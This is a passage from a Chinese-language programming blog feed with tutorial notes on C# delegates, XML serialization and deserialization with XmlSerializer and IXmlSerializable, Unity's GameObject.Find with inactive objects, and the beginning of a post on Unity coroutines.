<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Func&lt;<span class="keyword">string</span>&gt; funcString = Fun2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Func&lt;<span class="keyword">int</span>&gt; funcInt = Fun3;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">string</span> <span class="title">Fun2</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="string">"hello"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">Fun3</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="number">20</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>3.可以传n个参数的（系统提供16个）无返回值类型的委托 Action<T></T></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Action&lt;<span class="keyword">int</span>, <span class="keyword">string</span>&gt; action1 = Fun4;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Fun4</span>(<span class="params"><span class="keyword">int</span> i, <span class="keyword">string</span> s</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>4.可以穿n个参数的 （系统提供16个）并且有返回值类型的 Func&lt;in T, out TResult&gt;</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回值类型为最后一个</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Func&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; func5 = Fun5;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">Fun5</span>(<span class="params"><span class="keyword">int</span> <span class="keyword">value</span></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="keyword">value</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="7-总结"><a href="#7-总结" class="headerlink" title="7.总结"></a>7.总结</h3><p>简单理解 委托 就是装载、传递函数的容器而已<br>可以用委托变量 来存储函数或者传递函数的<br>系统其实已经提供了很多委托给我们用<br>Action:没有返回值，参数提供了 0到16个委托给我们用<br>Func:有返回值，参数提供了 0到16个委托给我们用</p>
]]></content>
  </entry>
  <entry>
    <title>XML反序列化</title>
    <url>/2021/05/16/XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<center>xml反序列化</center>

<p>xml序列化关键知识<br> 1.using 和 StreamWriter<br> 2.XmlSerializer 的 Serialize序列化方法</p>
<a id="more"></a>

<h4 id="1-反序列化"><a href="#1-反序列化" class="headerlink" title="1.反序列化"></a>1.反序列化</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> path = Application.persistentDataPath + <span class="string">"/Lesson1Test.xml"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//首先判断文件是否存在</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( File.Exists(path) )</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//读取文件</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">using</span> (StreamReader reader = <span class="keyword">new</span> StreamReader(path))</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//产生了一个 序列化反序列化的翻译机器</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        XmlSerializer s = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(Lesson1Test));</span></pre></td></tr><tr><td class="code"><pre><span class="line">        Lesson1Test lt = s.Deserialize(reader) <span class="keyword">as</span> Lesson1Test;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="meta">#<span class="meta-keyword">endregion</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">endregion</span></span></span></pre></td></tr></table></figure>

<h4 id="2-总结"><a href="#2-总结" class="headerlink" title="2.总结"></a>2.总结</h4><p>1.判断文件是否存在 File.Exists<br>2.文件流获取 StreamReader reader = new StreamReader(path)<br>3.根据文件流 XmlSerializer通过Deserialize反序列化 出对象</p>
<p>注意</p>
<p><font color="red">List对象 如果有默认值 反序列化时 不会清空 会往后面添加 </font></p>
<p><font color="red">因此不建议List在声明时就去初始化</font></p>
]]></content>
  </entry>
  <entry>
    <title>XML序列化</title>
    <url>/2021/05/16/XML%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<center>XML序列化</center>

<a id="more"></a>

<h4 id="1-什么是序列化和反序列化"><a href="#1-什么是序列化和反序列化" class="headerlink" title="1.什么是序列化和反序列化?"></a>1.什么是序列化和反序列化?</h4><p>序列化：把对象转化为可传输的字节序列过程称为序列化<br>反序列化：把字节序列还原为对象的过程称为反序列化</p>
<p>说人话：<br>序列化就是把想要存储的内容转换为字节序列用于存储或传递<br>反序列化就是把存储或收到的字节序列信息解析读取出来使用</p>
<h4 id="2-xml序列化"><a href="#2-xml序列化" class="headerlink" title="2.xml序列化"></a>2.xml序列化</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Lesson1Test</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    [<span class="meta">XmlElement(<span class="meta-string">"testPublic123123"</span>)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> testPublic = <span class="number">10</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> testPrivate = <span class="number">11</span>;        <span class="comment">//无法存储</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> testProtected = <span class="number">12</span>;    <span class="comment">//无法存储</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">internal</span> <span class="keyword">int</span> testInternal = <span class="number">13</span>;      <span class="comment">//无法存储</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> testPUblicStr = <span class="string">"123"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> testPro &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> Lesson1Test2 testClass = <span class="keyword">new</span> Lesson1Test2();</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] arrayInt = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>] &#123; <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> &#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    [<span class="meta">XmlArray(<span class="meta-string">"IntList"</span>)</span>]        <span class="comment">//修改List存储时的名字</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    [<span class="meta">XmlArrayItem(<span class="meta-string">"Int32"</span>)</span>]      <span class="comment">//修改List中每个子对象的名字</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> List&lt;<span class="keyword">int</span>&gt; listInt = <span class="keyword">new</span> List&lt;<span class="keyword">int</span>&gt;() &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> &#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> List&lt;Lesson1Test2&gt; listItem = <span class="keyword">new</span> List&lt;Lesson1Test2&gt;() &#123; <span class="keyword">new</span> Lesson1Test2(), <span class="keyword">new</span> Lesson1Test2() &#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//不支持字典</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//public Dictionary&lt;int, string&gt; testDic = new Dictionary&lt;int, string&gt;() &#123; &#123; 1, "123" &#125; &#125;;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Lesson1Test2</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//使用属性的方式存储在xml中，并将test1修改为Test1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    [<span class="meta">XmlAttribute(<span class="meta-string">"Test1"</span>)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> test1 = <span class="number">1</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    [<span class="meta">XmlAttribute()</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">float</span> test2 = <span class="number">1.1f</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    [<span class="meta">XmlAttribute()</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">bool</span> test3 = <span class="literal">true</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>



<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.第一步准备一个数据结构类</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Lesson1Test lt = <span class="keyword">new</span> Lesson1Test();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.进行序列化</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//  关键知识点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//  XmlSerializer 用于序列化对象为xml的关键类</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//  StreamWriter 用于存储文件  </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//  using 用于方便流对象释放和销毁</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第一步：确定存储路径</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> path = Application.persistentDataPath + <span class="string">"/Lesson1Test.xml"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(Application.persistentDataPath);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第二步：结合 using知识点 和 StreamWriter这个流对象 来写入文件</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">// 括号内的代码：写入一个文件流 如果有该文件 直接打开并修改 如果没有该文件 直接新建一个文件</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">// using 的新用法 括号当中包裹的声明的对象 会在 大括号语句块结束后 自动释放掉 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">// 当语句块结束 会自动帮助我们调用 对象的 Dispose这个方法 让其进行销毁</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">// using一般都是配合 内存占用比较大 或者 有读写操作时  进行使用的 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> (StreamWriter stream = <span class="keyword">new</span> StreamWriter(path))</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//第三步：进行xml文件序列化</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    XmlSerializer s = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(Lesson1Test));</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//这句代码的含义 就是通过序列化对象 对我们类对象进行翻译 将其翻译成我们的xml文件 写入到对应的文件中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//第一个参数 ： 文件流对象</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//第二个参数: 想要备翻译 的对象</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//注意 ：翻译机器的类型 一定要和传入的对象是一致的 不然会报错</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    s.Serialize(stream, lt);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h4 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h4><p>序列化流程<br>1.有一个想要保存的类对象<br>2.使用XmlSerializer 序列化该对象<br>3.通过StreamWriter 配合 using将数据存储 写入文件<br>注意：<br>1.只能序列化公共成员<br>2.不支持字典序列化<br>3.可以通过特性修改节点信息 或者设置属性信息<br>4.Stream相关要配合using使用</p>
]]></content>
  </entry>
  <entry>
    <title>IXmlSerializable接口</title>
    <url>/2021/05/16/IXmlSerializable%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<center>IXmlSerializable接口</center>

<a id="more"></a>

<h4 id="1-IXmlSerializable是什么？"><a href="#1-IXmlSerializable是什么？" class="headerlink" title="1.IXmlSerializable是什么？"></a>1.IXmlSerializable是什么？</h4><p>C#的XmlSerializer 提供了可拓展内容</p>
<p>可以让一些不能被序列化和反序列化的特殊类能被处理</p>
<p>让特殊类继承 IXmlSerializable 接口 实现其中的方法即可</p>
<h4 id="2-自定义实践类"><a href="#2-自定义实践类" class="headerlink" title="2.自定义实践类"></a>2.自定义实践类</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TestLesson3</span> : <span class="title">IXmlSerializable</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> test1;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> test2; <span class="comment">//若默认没有初始化且之后没有赋值则表示为空，不会被序列化进去</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> XmlSchema <span class="title">GetSchema</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//反序列化时会自动调用的方法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ReadXml</span>(<span class="params">XmlReader reader</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//在里面可以自定义反序列化 的规则</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//1.读属性</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//this.test1 = int.Parse(reader["test1"]);</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//this.test2 = reader["test2"];</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//2.读节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//方式一</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//reader.Read(); //这时读到的test1节点 &lt;test1&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//reader.Read(); //这时读到的test1节点包裹的内容  0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//this.test1 = int.Parse(reader.Value); //得到当前内容的值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//reader.Read();//这时读到的是尾部包裹的节点 &lt;/test1&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//reader.Read(); //这时读到的test2节点 &lt;test2&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//reader.Read(); //这时读到的test2节点包裹的内容  123</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//this.test2 = reader.Value; //得到当前内容的值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//ader.Read();//这时读到的是尾部包裹的节点 &lt;/test2&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//方式二</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//while (reader.Read())</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//&#123;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//    if (reader.NodeType == XmlNodeType.Element)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//    &#123;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//        switch (reader.Name)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//        &#123;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//            case "test1":</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//                reader.Read();</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//                this.test1 = int.Parse(reader.Value);</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//                break;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//            case "test2":</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//                reader.Read();</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//                this.test2 = reader.Value;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//                break;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//        &#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//    &#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//3.读包裹节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        XmlSerializer s = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(<span class="keyword">int</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">        XmlSerializer s2 = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(<span class="keyword">string</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//跳过根节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        reader.Read();</span></pre></td></tr><tr><td class="code"><pre><span class="line">        reader.ReadStartElement(<span class="string">"test1"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        test1 = (<span class="keyword">int</span>)s.Deserialize(reader);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        reader.ReadEndElement();</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        reader.ReadStartElement(<span class="string">"test2"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        test2 = s2.Deserialize(reader).ToString();</span></pre></td></tr><tr><td class="code"><pre><span class="line">        reader.ReadEndElement();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//序列化时会自动调用的方法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">WriteXml</span>(<span class="params">XmlWriter writer</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//在里面可以自定义序列化 的规则</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//如果要自定义 序列化的规则 一定会用到 XMLWriter中的一些方法 来进行序列化</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//1.写属性</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//writer.WriteAttributeString("test1", this.test1.ToString());</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//writer.WriteAttributeString("test2", this.test2);</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//2.写节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//writer.WriteElementString("test1", this.test1.ToString());</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//writer.WriteElementString("test2", this.test2);</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//3.写包裹节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        XmlSerializer s = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(<span class="keyword">int</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">        writer.WriteStartElement(<span class="string">"test1"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        s.Serialize(writer, test1);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        writer.WriteEndElement();</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        XmlSerializer s2 = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(<span class="keyword">string</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">        writer.WriteStartElement(<span class="string">"test2"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        s2.Serialize(writer, test2);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        writer.WriteEndElement();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>


<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">TestLesson3 t = <span class="keyword">new</span> TestLesson3();</span></pre></td></tr><tr><td class="code"><pre><span class="line">t.test2 = <span class="string">"123"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> path = Application.persistentDataPath + <span class="string">"/Lesson3Test.xml"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> (StreamWriter writer = <span class="keyword">new</span> StreamWriter(path))</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//序列化翻译机器</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    XmlSerializer s = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(TestLesson3));</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//在序列化时 如果对象中的引用成员 为空 那么xml里面是看不到该字段的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    s.Serialize(writer, t);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//反序列化</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> (StreamReader reader = <span class="keyword">new</span> StreamReader(path))</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    XmlSerializer s = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(TestLesson3));</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//在序列化时 如果对象中的引用成员 为空 那么xml里面是看不到该字段的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    TestLesson3 lt = s.Deserialize(reader) <span class="keyword">as</span> TestLesson3;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>GameObject.Find</title>
    <url>/2021/03/19/GameObject.Find/</url>
    <content><![CDATA[<p>在学习的过程中使用了GameObject.Find()来查找隐藏的物体并激活成功，但在之后一个场景使用GameObject.Find()却找不到隐藏物体，纠结了许久，因此在做一个测试来检查该函数的用法。</p>
<a id="more"></a>

<h3 id="GameObject-Find-的正确使用"><a href="#GameObject-Find-的正确使用" class="headerlink" title="GameObject.Find()的正确使用"></a>GameObject.Find()的正确使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GameObject.Find(&quot;GameObject&quot;)</span></pre></td></tr><tr><td class="code"><pre><span class="line">GameObject.Find(&quot;GameObject&#x2F;ChildGameObject&quot;)</span></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hu_hao_kai/blog-image/raw/master/img/image-20210319203144431.png" alt></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">GameObject.Find(<span class="string">"Canvas/111"</span>).SetActive(<span class="literal">true</span>);                     <span class="literal">false</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">GameObject.Find(<span class="string">"Canvas/222/111"</span>).SetActive(<span class="literal">true</span>);                 <span class="literal">true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">GameObject.Find(<span class="string">"Canvas/222/222"</span>).SetActive(<span class="literal">true</span>);	               <span class="literal">true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">GameObject.Find(<span class="string">"Canvas/333/111/111"</span>).SetActive(<span class="literal">true</span>);             <span class="literal">true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">GameObject.Find(<span class="string">"Canvas/333/222"</span>).SetActive(<span class="literal">true</span>);                 <span class="literal">true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">GameObject.Find(<span class="string">"Canvas/444"</span>).SetActive(<span class="literal">true</span>);                     <span class="literal">false</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">GameObject.Find(<span class="string">"Canvas/444/555"</span>).SetActive(<span class="literal">true</span>);                 <span class="literal">false</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">GameObject.Find(<span class="string">"Canvas/444/555/666"</span>).SetActive(<span class="literal">true</span>);             <span class="literal">false</span></span></pre></td></tr></table></figure>

<p>因此得出结果需要在Canvas中的父物体处于被激活的状态才能够被Find找到它们的子物体</p>
<p>而在Canvas直接下一层的物体若没有处于激活状态则无法找到物体。</p>
<p>到此，已解决我之前Find无法找到的问题。</p>
<p>注：GameObject.Find()可以查找隐藏物体，但只限于父物体被激活中的隐藏的子物体，而不能直接找到被隐藏的父物体。</p>
<p>GameObject.Find()的优缺点</p>
<p>优点：</p>
<p>1、解决查找中可能重名的问题。</p>
<p>2、在有完全路径的时候可以减少查找范围，减少时间。</p>
<p>缺点：</p>
<p>1、路径或结构调整后，容易影响到程序中的查找，需要重新定位查找路径。</p>
<p>2、查找效率低下，比较消耗性能，切忌在Update()中动态查找，建议放在Start()中查找</p>
<p>3、无法查找隐藏物体（注：该物体指的是父物体）</p>
]]></content>
  </entry>
  <entry>
    <title>unity协程原理</title>
    <url>/2021/05/16/unity%E5%8D%8F%E7%A8%8B%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<center>Unity协程原理</center>

<p>深入地了解了下Unity中协程的原理</p>
<a id="more"></a>

<h4 id="1、协程的本质"><a href="#1、协程的本质" class="headerlink" title="1、协程的本质"></a>1、协程的本质</h4><p>协程可以分成两部分<br>1.协程函数本体<br>2.协程调度器</p>
<p>协程本体就是一个能够中间暂停返回的函数<br>协程调度器是Unity内部实现的，会在对应的时机帮助我们继续执行协程函数</p>
<p>Unity只实现了协程调度部分<br>协程的本体本质上就是一个 C#的迭代器方法</p>
<h3 id="2、协程本体是迭代器方法的体现"><a href="#2、协程本体是迭代器方法的体现" class="headerlink" title="2、协程本体是迭代器方法的体现"></a>2、协程本体是迭代器方法的体现</h3><p>1.协程函数本体<br>如果我们不通过 开启协程方法执行协程<br>Unity的协程调度器是不会帮助我们管理协程函数的</p>
